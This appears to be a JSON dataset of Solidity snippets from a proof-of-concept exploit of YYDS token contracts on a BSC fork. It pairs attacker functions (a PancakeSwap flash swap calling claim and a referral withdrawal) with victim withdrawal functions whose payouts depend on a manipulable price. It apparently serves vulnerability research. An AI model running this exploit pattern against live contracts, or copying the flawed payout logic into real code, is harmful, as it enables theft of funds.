[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        emit log_named_decimal_uint(\"Attacker YYDS balance before exploit\", YYDS.balanceOf(address(this)), 18);\n\n        targetClaim.claim(address(this));\n        try targetWihtdraw.withdrawReturnAmountByReferral() {} catch {}\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 21_157_025);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"[Start] Attacker USDT balance before exploit\", USDT.balanceOf(address(this)), 18);\n\n        (reserve0, reserve1,) = Pair.getReserves();\n        uint256 amount0Out = USDT.balanceOf(address(Pair));\n        Pair.swap(amount0Out - 1 * 1e18, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TargetWithdraw",
    "source_type": "victim_contract",
    "function_name": "withdrawReturnAmountByConsumer",
    "original_code": "    function withdrawReturnAmountByConsumer() public {\n        uint256 totalReturnAmount;\n        for (uint i=0;i<consumers[msg.sender].length;i++){\n            ConsumerInfo storage consumerInfo=consumers[msg.sender][i];\n            uint256 returnCount=1;\n            uint256 returnAmount;\n            if (consumerInfo.returnTime>block.timestamp){\n                continue;\n            }\n            if (block.timestamp>consumerInfo.returnTime){\n             returnCount=returnCount.add((block.timestamp-consumerInfo.returnTime).div(24 hours));\n            }\n            if (consumerInfo.amount.mul(5).div(10000).mul(returnCount)>consumerInfo.remainingAmount){\n             returnAmount=consumerInfo.remainingAmount;\n            }else{\n              returnAmount=consumerInfo.amount.mul(5).div(10000).mul(returnCount);\n            }\n            totalReturnAmount=totalReturnAmount.add(returnAmount);\n            consumerInfo.remainingAmount=consumerInfo.remainingAmount.sub(returnAmount);\n            consumerInfo.returnTime=consumerInfo.returnTime.add(24 hours*returnCount);\n            consumerInfo.returnHistory.push(ReturnHistory({returnTime:block.timestamp,returnRatio:returnAmount}));\n        }\n        require(totalReturnAmount>0,\"totalReturnAmount err\");\n        uint256 priceOfUSDT=getPriceOfUSDT();\n        uint256 yydsAmount=totalReturnAmount.mul(10**18).div(priceOfUSDT);\n\n        IERC20(management(managementAddress).yydsAddress()).safeTransfer(\n                            msg.sender,\n                            yydsAmount\n        );\n        statisticsByUser[msg.sender].extractedConsumerReturn=statisticsByUser[msg.sender].extractedConsumerReturn.add(totalReturnAmount);\n        totalConsumerReturn=totalConsumerReturn.add(totalReturnAmount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TargetWithdraw",
    "source_type": "victim_contract",
    "function_name": "withdrawReturnAmountByMerchant",
    "original_code": "    function withdrawReturnAmountByMerchant() public {\n        uint256 totalReturnAmount;\n        for (uint i=0;i<merchants[msg.sender].length;i++){\n            MerchantInfo storage merchantInfo=merchants[msg.sender][i];\n            uint256 returnCount=1;\n            uint256 returnAmount;\n            if (merchantInfo.returnTime>block.timestamp){\n                continue;\n            }\n            if (block.timestamp>merchantInfo.returnTime){\n             returnCount=returnCount.add((block.timestamp-merchantInfo.returnTime).div(24 hours));\n            }\n            if (merchantInfo.amount.mul(5).div(10000).mul(returnCount)>merchantInfo.remainingAmount){\n             returnAmount=merchantInfo.remainingAmount;\n            }else{\n              returnAmount=merchantInfo.amount.mul(5).div(10000).mul(returnCount);\n            }\n            totalReturnAmount=totalReturnAmount.add(returnAmount);\n            merchantInfo.remainingAmount=merchantInfo.remainingAmount.sub(returnAmount);\n            merchantInfo.returnTime=merchantInfo.returnTime.add(24 hours*returnCount);\n            merchantInfo.returnHistory.push(ReturnHistory({returnTime:block.timestamp,returnRatio:returnAmount}));\n        }\n        require(totalReturnAmount>0,\"totalReturnAmount err\");\n\n        uint256 priceOfUSDT=getPriceOfUSDT();\n        uint256 yydsAmount=totalReturnAmount.mul(10**18).div(priceOfUSDT);\n\n        IERC20(management(managementAddress).yydsAddress()).safeTransfer(\n                            msg.sender,\n                            yydsAmount\n        );\n        statisticsByUser[msg.sender].extractedMerchantReturn=statisticsByUser[msg.sender].extractedMerchantReturn.add(totalReturnAmount);\n        totalMerchantReturn=totalMerchantReturn.add(totalReturnAmount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TargetWithdraw",
    "source_type": "victim_contract",
    "function_name": "withdrawReturnAmountByReferral",
    "original_code": "    function withdrawReturnAmountByReferral() public {\n\n        uint256 totalReturnAmount;\n\n        for (uint i=0;i<users[msg.sender].length;i++){\n            ReferralRewardInfo storage referralRewardInfo=users[msg.sender][i];\n            uint256 returnCount=1;\n            uint256 returnAmount;\n            if (referralRewardInfo.returnTime>block.timestamp){\n                continue;\n            }\n            if (block.timestamp>referralRewardInfo.returnTime){\n             returnCount=returnCount.add((block.timestamp-referralRewardInfo.returnTime).div(24 hours));\n            }\n            if (referralRewardInfo.amount.mul(5).div(10000).mul(returnCount)>referralRewardInfo.remainingAmount){\n             returnAmount=referralRewardInfo.remainingAmount;\n            }else{\n              returnAmount=referralRewardInfo.amount.mul(5).div(10000).mul(returnCount);\n            }\n            totalReturnAmount=totalReturnAmount.add(returnAmount);\n            referralRewardInfo.remainingAmount=referralRewardInfo.remainingAmount.sub(returnAmount);\n            referralRewardInfo.returnTime=referralRewardInfo.returnTime.add(24 hours*returnCount);\n        }\n        require(totalReturnAmount>0,\"totalReturnAmount err\");\n\n        uint256 priceOfUSDT=getPriceOfUSDT();\n        uint256 yydsAmount=totalReturnAmount.mul(10**18).div(priceOfUSDT);\n\n        IERC20(management(managementAddress).yydsAddress()).safeTransfer(\n                            msg.sender,\n                            yydsAmount\n        );\n        statisticsByUser[msg.sender].extractedReferralReward=statisticsByUser[msg.sender].extractedReferralReward.add(totalReturnAmount);\n        totalReferralReturn=totalReferralReturn.add(totalReturnAmount);\n\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "TargetClaim",
    "source_type": "victim_contract",
    "function_name": "claim",
    "original_code": "",
    "description": ""
  }
]